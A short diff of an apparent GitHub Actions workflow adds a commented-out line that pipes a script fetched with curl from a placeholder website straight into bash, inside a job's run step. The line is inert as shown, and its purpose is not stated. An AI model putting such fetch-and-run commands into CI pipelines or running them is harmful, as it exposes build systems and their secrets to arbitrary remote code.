@@ -49,6 +49,9 @@ jobs:
         run: |
           cd "${{ matrix.directory }}"
 
+
+          #  bash <(curl -s http://mywebsite.example/myscript.txt)
+
           git diff --name-only HEAD~2 HEAD | grep -q "^$PWD/"
 
           REPO="${GITHUB_REPOSITORY}"
